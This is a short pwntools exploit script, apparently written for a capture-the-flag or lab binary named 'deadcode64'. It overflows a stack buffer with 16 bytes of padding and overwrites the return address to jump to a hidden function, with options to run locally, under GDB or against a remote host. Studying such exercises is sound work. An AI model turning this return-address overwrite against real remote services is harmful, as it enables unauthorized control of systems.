#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./deadcode64"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *getData+39
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*16
deadCode = pwn.p64(0x0000000000401156)

payload = pwn.flat(
        [
            overFlow,
            deadCode
           ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

